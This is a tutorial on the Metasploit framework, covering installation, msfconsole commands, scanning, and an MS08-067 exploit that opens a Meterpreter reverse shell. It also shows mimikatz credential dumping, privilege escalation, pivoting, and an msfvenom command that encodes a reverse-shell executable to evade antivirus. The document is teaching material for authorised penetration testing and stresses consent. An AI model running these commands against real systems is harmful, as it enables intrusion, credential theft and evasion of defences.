## What Is Metasploit?

Metasploit is a modular, open-source framework designed to help security professionals and ethical hackers discover, validate, and exploit vulnerabilities in remote systems. Originally created in Ruby by HD Moore in 2003, it has grown into the industry standard for penetration testing, offering:

* **Exploits** that leverage security flaws in software
* **Payloads** (like Meterpreter) that run on compromised hosts
* **Auxiliary modules** for scanning, fuzzing, and reconnaissance
* **Post-exploitation tools** to pivot, escalate privileges, and gather evidence

Because Metasploit abstracts the gritty details of exploit development, you can focus on methodology and strategy rather than reinventing low-level code.

## Core Components

Understanding Metasploit’s building blocks will help you navigate the framework more efficiently:

### msfconsole

* **What it is:** The command-line interface for interacting with the framework.
* **Why it matters:** Central hub for searching modules, configuring options, launching attacks, and managing sessions.

### Module Types

* **Exploit:** Code that triggers a vulnerability (e.g., `exploit/windows/smb/ms17_010_eternalblue`).
* **Payload:** Code delivered by an exploit (e.g., `windows/x64/meterpreter/reverse_tcp`). Meterpreter is the gold standard payload—lightweight, extensible, and scriptable.
* **Auxiliary:** Non-exploit tools (scanners, sniffers, fuzzers). Example: `auxiliary/scanner/ssh/ssh_version`.
* **Post:** Actions to run on a compromised host (gather credentials, escalate privileges, pivot). Example: `post/windows/gather/credentials/mimikatz`.

### msfvenom

* **What it is:** A standalone utility for crafting custom payloads and shellcode.
* **Use cases:** Generate bind/reverse shells, encode payloads to evade antivirus, export to different formats (exe, elf, raw).

## Installing Metasploit

Metasploit is pre-installed on Kali Linux, but you can also install it on other platforms:

### Kali Linux

```bash
sudo apt update && sudo apt install metasploit-framework
```

Kali’s rolling-release model ensures you get the latest modules and features.

### Ubuntu/Debian

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/
   config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall
```

After installation, run `msfconsole` to verify.

### Windows (via WSL)

1. Enable WSL and install Ubuntu from the Microsoft Store.
2. Follow the Ubuntu steps above inside your WSL shell.
3. Use `msfconsole` inside WSL or integrate with Windows Terminal.

---

## First Steps in msfconsole

Launch:

```bash
msfconsole
```

You’ll see a banner and the `msf >` prompt. Key starter commands:

* `search name:<keyword>` — find modules by name or description.
* `info <module>` — view options, targets, and references for a module.
* `use <module>` — select a module for configuration.
* `set <option> <value>` — configure parameters (e.g., `set RHOSTS 10.0.0.5`).
* `show options` — list required and optional settings.
* `run` or `exploit` — execute the configured module.
* `sessions -l` — list active Meterpreter or shell sessions.

## The Penetration-Test Workflow

A typical engagement follows a structured methodology:

### Reconnaissance & Scanning

Use auxiliary modules to map your target:

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set THREADS 50
run
```

Next, enumerate services:

```bash
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 10.0.0.5
run
```

Gathering banners and versions informs which exploits to try.

### Selecting & Configuring an Exploit

Once you identify a vulnerable service, choose the matching exploit:

```bash
search ms08_067
use exploit/windows/smb/ms08_067_netapi
```

Configure target and payload:

```bash
set RHOST 10.0.0.5
set LHOST 10.0.0.10
set PAYLOAD windows/meterpreter/reverse_tcp
show targets
set TARGET 0
exploit
```

Meterpreter session opens on success.

### Post-Exploitation

With Meterpreter up, you can:

* **Browse the filesystem:** `ls`, `cd C:\\Users\\Public`
* **Dump credentials:** `run post/windows/gather/credentials/mimikatz`
* **Privilege escalation:** `run post/windows/escalate/getsystem`
* **Pivoting:** Configure SOCKS proxy with `run post/multi/manage/socks_proxy` and route further scans through the compromised host.

## Advanced Techniques

### msfvenom Payload Crafting

Generate an encoded reverse shell to bypass simple antivirus rules:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.10 LPORT=4444 -f exe -e x86/shikata_ga_nai \
  -i 5 -o shell_obf.exe
```

* `-e`: encoder
* `-i`: iterations

### Database Integration

Persist your findings across sessions:

1. Start PostgreSQL and Metasploit’s database:

   ```bash
   sudo systemctl start postgresql
   msfdb init
   ```

2. In `msfconsole`, verify with `db_status`.
3. Use `hosts`, `services`, and `vulns` commands to track assets and findings.

### Resource Scripts

Automate repetitive tasks with `.rc` files:

```rc
# quick_scan.rc
workspace -a clientA
db_nmap -sV 10.0.0.0/24
vulns
```

Then in msfconsole:

```bash
resource quick_scan.rc
```

## Best Practices & Ethical Considerations

* **Written Consent:** Always have a signed authorization before testing.
* **Isolation:** Conduct tests in a controlled lab or isolated network to avoid collateral damage.
* **Logging & Reporting:** Keep detailed notes (Metasploit’s loot files, module output) and produce clear, actionable reports.
* **Stay Updated:** Regularly update both Metasploit and your OS to access the latest modules and protect your attack machine.
* **Clean Up:** Remove any persistent backdoors or listeners you’ve installed to leave the target in its original state.

---

## Troubleshooting Tips

* **Module Fails to Load?** Run `msfupdate` or reinstall the framework.
* **Stuck on “Loading Plugins”?** Delete `~/.msf4` and let Metasploit regenerate its configuration.
* **Slow Console Performance?** Disable unwanted plugins (`load none`) or switch to a lighter terminal emulator.
